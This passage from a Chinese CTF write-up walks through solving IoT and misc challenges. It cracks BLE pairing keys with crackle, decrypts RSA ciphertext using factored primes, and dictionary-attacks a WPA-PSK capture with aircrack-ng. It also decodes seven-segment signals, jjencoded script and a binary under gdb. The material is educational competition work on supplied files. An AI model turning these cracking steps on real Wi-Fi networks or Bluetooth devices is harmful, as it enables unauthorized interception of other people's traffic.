</span><span style="display:block;padding:0 1.25rem"> [157] NORDIC_BLE_SNIFFER_META
</span><span style="display:block;padding:0 1.25rem"> [272] NORDIC_BLE</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">继续找，有人提到了怎么解密BLUETOOTH_LE_LL。<a target="_blank" rel="noopener noreferrer" href="https://github.com/arunima06/crackle" class="link-_707cf  link_3b154 inline-link_3b154">https://github.com/arunima06/crackle</a> 但是代码没有合入master。用它提供的工具进行解密。成功获取了解密数据包文件。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>$ ./crackle -i ~/Downloads/BLE03.pcapng -o ~/Downloads/BLE03.decrypted.pcap
</span></span><span style="display:block;padding:0 1.25rem">PCAP contains [BLUETOOTH_LE_LL] frames
</span><span style="display:block;padding:0 1.25rem">Found 1 connection
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">Analyzing connection 0:
</span><span style="display:block;padding:0 1.25rem">  75:48:3c:00:4a:a5 (random) -&gt; f6:c5:05:1c:dd:ec (random)
</span><span style="display:block;padding:0 1.25rem">  Found 28 encrypted packets
</span><span style="display:block;padding:0 1.25rem">  Cracking with strategy 0, 20 bits of entropy
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">  !!!
</span><span style="display:block;padding:0 1.25rem">  TK found: 364095
</span><span style="display:block;padding:0 1.25rem">  !!!
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">  Decrypted 27 packets
</span><span style="display:block;padding:0 1.25rem">  LTK found: ba011ff2ee65f868cc2c343aacf3fde7
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">Decrypted 27 packets, dumping to PCAP
</span><span style="display:block;padding:0 1.25rem">Done, processed 737 total packets, decrypted 27</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">wireshark打开，翻找最后的请求，发现两段flag。flag{3dbd26cb04d9ae7b8c89628c032ee7d2}</p>
<p class="my-4 leading-7"><img alt="flag-1" src="/static/image/iot-5-2.9ba43ad4.png"/>
<img alt="flag-2" src="/static/image/iot-5-3.ca307b7e.png"/></p>
<h3 id="iot-8-ble2" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot-8-ble2">#</a>IoT-8 BLE2</h3>
<p class="my-4 leading-7">这个题的步骤有点多。</p>
<p class="my-4 leading-7">用wireshark打开数据包文件。过滤条件输入btatt，这里只关注数据传输的相关Frame。</p>
<p class="my-4 leading-7"><img alt="ble_wireshark" src="/static/image/iot-8-1.30dae2f6.png"/></p>
<p class="my-4 leading-7"><img alt="public_key" src="/static/image/iot-8-2.73a6df1d.png"/></p>
<p class="my-4 leading-7">在中间部分发现了一个公钥的开头，后面的两个数据包都是在传输公钥。将两个数据包的公钥提取出来备用。</p>
<p class="my-4 leading-7">合理猜测一下，接下来肯定要传输公钥加密后的密文了。把所有的Send Write Request的数据内容提取出来。</p>
<p class="my-4 leading-7"><img alt="request" src="/static/image/iot-8-3.71d8a4fe.png"/></p>
<p class="my-4 leading-7">这里存成hex字符串备用</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>2ee76ad6ff3d3770dfeccfa2a55554941f1bd64fe7b002bb2fc7c318a60da5ad94b3e1c73571dabc38450d8807b81ee136d4367bacbad77f023c8d428381ae0b24cf92a170c84deb71b78fb24e0dfe9a16980c39d7482d5b8db8eb3fd147ffda193f1154d9f8e32212494005f8ad9f3089c6c4d30bddb964a999ccfa10dfd8b0</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">下一步需要解密这个字符串数据。这里涉及到公钥解密的算法，需要找到几个参数：</p>
<ol class="list-decimal pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">获取公钥的基本信息
<img alt="获取公钥信息" src="/static/image/iot-8-4.6a23ed50.png"/></li>
<li class="[&amp;:not(:first-child)]:mt-2">将n转成10进制，在网站上 <a target="_blank" rel="noopener noreferrer" href="http://factordb.com/index.php?id=1100000001582802043" class="link-_707cf  link_3b154 inline-link_3b154">http://factordb.com/index.php?id=1100000001582802043</a> 分解得到p和q。
<img alt="大数分解" src="/static/image/iot-8-5.7055cb05.png"/></li>
<li class="[&amp;:not(:first-child)]:mt-2">将获得的所有参数代入公式中，c是需要解密的密文。最终得到flag。（其实不想用python的，但是抵不住python处理大数真的很方便）</li>
</ol>
<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import libnum
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">n = 143000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007088000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000079569
</span><span style="display:block;padding:0 1.25rem">p = 11000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000189
</span><span style="display:block;padding:0 1.25rem">q = 13000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000421
</span><span style="display:block;padding:0 1.25rem">e = 65537
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">phi = (p - 1) * (q - 1)
</span><span style="display:block;padding:0 1.25rem">d = libnum.invmod(e, phi)
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">c = int(
</span><span style="display:block;padding:0 1.25rem">    &quot;2ee76ad6ff3d3770dfeccfa2a55554941f1bd64fe7b002bb2fc7c318a60da5ad94b3e1c73571dabc38450d8807b81ee136d4367bacbad77f023c8d428381ae0b24cf92a170c84deb71b78fb24e0dfe9a16980c39d7482d5b8db8eb3fd147ffda193f1154d9f8e32212494005f8ad9f3089c6c4d30bddb964a999ccfa10dfd8b0&quot;,
</span><span style="display:block;padding:0 1.25rem">    16)
</span><span style="display:block;padding:0 1.25rem">m = pow(c, d, n)
</span><span style="display:block;padding:0 1.25rem">print(libnum.n2s(m))</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7"><img alt="结果" src="/static/image/iot-8-6.6838de0a.png"/></p>
<h3 id="iot-9-你的wi-fi流量被监听了么" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot-9-你的wi-fi流量被监听了么">#</a>IoT-9 你的Wi-Fi流量被监听了么？</h3>
<p class="my-4 leading-7">给了一个pcap文件，第一次玩流量分析，一步一坑的解决了。</p>
<p class="my-4 leading-7">用Wireshark打开文件，以为直接找HTTP协议，发现不行。都是802.11协议。查找发现是与wifi设备通信的协议，被加密了，需要获取解密密钥。</p>
<p class="my-4 leading-7">这里用Aircrack-ng进行爆破</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>brew install aircrack-ng
</span></span><span style="display:block;padding:0 1.25rem">aircrack-ng -1 -a 2 -b 28:ed:e0:62:52:d6 ./monitorAP.pcap -w ./rockyou.txt
</span><span style="display:block;padding:0 1.25rem"># -b 后面是wifi的BSSID，大部分链接的都是miCTF，wireshark-&gt;wireless-&gt;WLAN Traffic可以查询到
</span><span style="display:block;padding:0 1.25rem"># -a 打表加密类型，1:WEP 2:WPA-PSK
</span><span style="display:block;padding:0 1.25rem"># -w 需要一个字典，从网上找了一个</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">爆破找到密码</p>
<p class="my-4 leading-7"><img alt="aircrack-ng爆破" src="/static/image/iot-9-1.f1d2557d.png"/></p>
<p class="my-4 leading-7">找到密码了之后可以用wireshark-&gt;Frame上右键-&gt;...-&gt;输入解密密钥。</p>
<p class="my-4 leading-7"><img alt="输入密钥" src="/static/image/iot-9-2.db88de37.png"/></p>
<p class="my-4 leading-7"><img alt="密钥是xxxx" src="/static/image/iot-9-3.6dc92d7e.png"/></p>
<p class="my-4 leading-7">接下来wireshark会自动解密请求。然后开始找可疑请求，先从HTTP协议开始找，因为最容易辨认。</p>
<p class="my-4 leading-7"><img alt="可疑的请求" src="/static/image/iot-9-4.bef604d3.png"/></p>
<p class="my-4 leading-7">可以看到有一个发送的POST请求，里面有可疑的flag，但是直接提交上去没有通过。</p>
<p class="my-4 leading-7">猜测可能被加密了，因为Encrypted=1。用Base64解密，获取到了还算“正常”的flag，提交通过。</p>
<h3 id="iot-10-7-segment" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#iot-10-7-segment">#</a>IoT-10 7 segment</h3>
<p class="my-4 leading-7">这是一个综合的题目，结合了前面的信号分析和PCB查看。</p>
<blockquote class="border-l-2 border-solid border-divider pl-4 my-6 transition-colors duration-500 blockquote_3b154">
<p class="my-4 leading-7">开始还不知道7 segment是什么意思，后来又查了一下叫七段数码管，就是计算器那种展示方式。</p>
</blockquote>
<p class="my-4 leading-7">给了一个sal文件和PCB图纸。先看PCB图纸。</p>
<p class="my-4 leading-7"><img alt="PCB图纸" src="/static/image/iot-10-1.92b537cf.png"/></p>
<p class="my-4 leading-7">是一个“荷魯斯之眼”的标识，里面有线路，线路连接着几个输入点。对照网上的引脚图，可以把输入点和对应显示的线段标识出来。</p>
<p class="my-4 leading-7"><img alt="引脚" src="/static/image/iot-10-2.d3b4519b.png"/></p>
<p class="my-4 leading-7"><img alt="手绘" src="/static/image/iot-10-3.20e009fb.png"/></p>
<p class="my-4 leading-7">然后看信号文件。</p>
<p class="my-4 leading-7"><img alt="信号" src="/static/image/iot-10-4.4d0375b7.png"/></p>
<p class="my-4 leading-7">对照信号文件把高低电平找出来，然后根据接口和线段的对应关系，就能把展示的数字还原出来。</p>
<p class="my-4 leading-7">这里手动还原也可以。当然你也可以写个程序搜一下，就是把数字字母编码和对应的信息的排列组合试一下。把都满足的结果输出出来。</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2023.iot10
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">val data = arrayOf(
</span><span style="display:block;padding:0 1.25rem">    &quot;111101010011010101010101011011&quot;,
</span><span style="display:block;padding:0 1.25rem">//    &quot;111111111111111111111111111111&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;111101011101111111011111111100&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;111101010011011111111101111010&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;111111111111110101110111010110&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;100110101100100000100110001110&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;111001010011011111001001111010&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;111001010011011111111001110000&quot;,
</span><span style="display:block;padding:0 1.25rem">)
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">val digitMap = mapOf&lt;String, String&gt;(
</span><span style="display:block;padding:0 1.25rem">    &quot;1111101&quot; to &quot;0&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;0101000&quot; to &quot;1&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;0110111&quot; to &quot;2&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;0101111&quot; to &quot;3&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1101010&quot; to &quot;4&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1001111&quot; to &quot;5&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1011111&quot; to &quot;6&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;0101100&quot; to &quot;7&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1111111&quot; to &quot;8&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1101111&quot; to &quot;9&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1111110&quot; to &quot;a&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1011011&quot; to &quot;b&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1010101&quot; to &quot;c&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;0111011&quot; to &quot;d&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1010111&quot; to &quot;e&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;1010110&quot; to &quot;f&quot;,
</span><span style="display:block;padding:0 1.25rem">)
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun check(used: IntArray) {
</span><span style="display:block;padding:0 1.25rem">    val sb = StringBuilder()
</span><span style="display:block;padding:0 1.25rem">    val digit = CharArray(7)
</span><span style="display:block;padding:0 1.25rem">    for (i in 0 until 29 ) {
</span><span style="display:block;padding:0 1.25rem">        for (j in 0 until data.size) {
</span><span style="display:block;padding:0 1.25rem">            digit[used[j]] = data[j][i]
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">        val dig = digit.joinToString(&quot;&quot;)
</span><span style="display:block;padding:0 1.25rem">        if (digitMap.containsKey(dig)) {
</span><span style="display:block;padding:0 1.25rem">            sb.append(digitMap[dig]!!)
</span><span style="display:block;padding:0 1.25rem">        } else {
</span><span style="display:block;padding:0 1.25rem">//            println(&quot;not found for ${used.joinToString(&quot;,&quot;)}&quot;)
</span><span style="display:block;padding:0 1.25rem">            return
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    println(sb.toString())
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun dfs(used: IntArray, level: Int) {
</span><span style="display:block;padding:0 1.25rem">    if (level == 7) {
</span><span style="display:block;padding:0 1.25rem">        check(used)
</span><span style="display:block;padding:0 1.25rem">        return
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    for (i in 0 until used.size) {
</span><span style="display:block;padding:0 1.25rem">        if (used[i] &lt; 0) {
</span><span style="display:block;padding:0 1.25rem">            used[i] = level
</span><span style="display:block;padding:0 1.25rem">            dfs(used, level + 1)
</span><span style="display:block;padding:0 1.25rem">            used[i] = -1
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun main() {
</span><span style="display:block;padding:0 1.25rem">    val used = IntArray(7) {
</span><span style="display:block;padding:0 1.25rem">        -1
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    dfs(used, 0)
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">最后一个是干扰项，搜索的时候暂时去掉了。</p>
<p class="my-4 leading-7">最终还原出来的的信息是 <code>8663161677b676f6f645f376f627d_</code> 。这个明显是加密的。。。但是不知道怎么解密。。。</p>
<p class="my-4 leading-7">======================卡了很久的分割线=================</p>
<p class="my-4 leading-7">期间试过很多种解密，都没啥效果。于是又把那个网站找出来 <a target="_blank" rel="noopener noreferrer" href="https://www.dcode.fr/cipher-identifier" class="link-_707cf  link_3b154 inline-link_3b154">https://www.dcode.fr/cipher-identifier</a> 判断一下加密方式。</p>
<p class="my-4 leading-7"><img alt="猜测解密方式" src="/static/image/iot-10-5.3e861d0e.png"/></p>
<p class="my-4 leading-7">这四种概率挺高的，继续实验。在试到环式移位（Circular Bit Shift）发现结果很像一个flag。</p>
<p class="my-4 leading-7"><img alt="很像flag" src="/static/image/iot-10-6.032e411f.png"/></p>
<p class="my-4 leading-7">调整移位的数量，最终发现flag。</p>
<p class="my-4 leading-7"><img alt="最终flag" src="/static/image/iot-10-7.308fff37.png"/></p>
<h2 id="misc" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc">#</a>Misc</h2>
<h3 id="misc-1-红线红线红线" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc-1-红线红线红线">#</a>misc-1 红线！红线！红线！</h3>
<p class="my-4 leading-7">根据提示 <code>tomorrow is another day</code> 去github上搜索（你说为什么不在gitlab里搜索？公司的gitlab有搜索吗。。。），
找到一个仓库，翻看提交记录，找到flag</p>
<p class="my-4 leading-7"><img alt="搜索记录" src="/static/image/misc-1-1.e6899e34.png"/></p>
<p class="my-4 leading-7"><img alt="commit记录" src="/static/image/misc-1-2.d9b528d3.png"/></p>
<h3 id="misc-2-有趣的前端" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc-2-有趣的前端">#</a>misc-2 有趣的前端</h3>
<p class="my-4 leading-7">页面写了一些字符，不知道做什么的，直接看源码</p>
<p class="my-4 leading-7">源码的 <code>&lt;script&gt;</code> 里有个注释，很可疑，拿去base64解码</p>
<p class="my-4 leading-7"><img alt="base64解码" src="/static/image/misc-2-1.6d0e8a7f.png"/></p>
<p class="my-4 leading-7">直接放在网页控制台里执行，居然可以正常执行。。。最后查了一下，原来是一个叫jjencode的编码方式，找了个解码网站 <a target="_blank" rel="noopener noreferrer" href="https://www.53lu.com/tool/jjencode/" class="link-_707cf  link_3b154 inline-link_3b154">https://www.53lu.com/tool/jjencode/</a></p>
<p class="my-4 leading-7"><img alt="jjencode解码" src="/static/image/misc-2-2.146ab6f1.png"/></p>
<p class="my-4 leading-7">原来是写在了localstorage里面了。。。</p>
<h3 id="misc-3-敏感数据" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc-3-敏感数据">#</a>misc-3 敏感数据</h3>
<p class="my-4 leading-7">这个题给了hint，在程序退出的时候下断点，然后查找。</p>
<p class="my-4 leading-7">目标很明确，但是调试工具基本没用过，然后就开始疯狂的谷歌之旅，疯狂的踩坑。</p>
<p class="my-4 leading-7">坑一，程序在ubuntu环境下运行不起来。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>$ ./mm
</span></span><span style="display:block;padding:0 1.25rem">-bash: ./mm: 没有那个文件或目录</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">因为这是个32位的ELF，而系统是64位的，需要安装32位的库。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>sudo apt install ia32-libs 或 sudo apt install lib32bz2
</span></span><span style="display:block;padding:0 1.25rem">sudo apt install gcc-multilib</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">坑二，使用gdb如何设置退出断点</p>
<p class="my-4 leading-7">这个问题倒是没有困扰太久，很快找到了答案。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>$ gdb ./mm
</span></span><span style="display:block;padding:0 1.25rem">(gdb) catch syscall exit exit_group
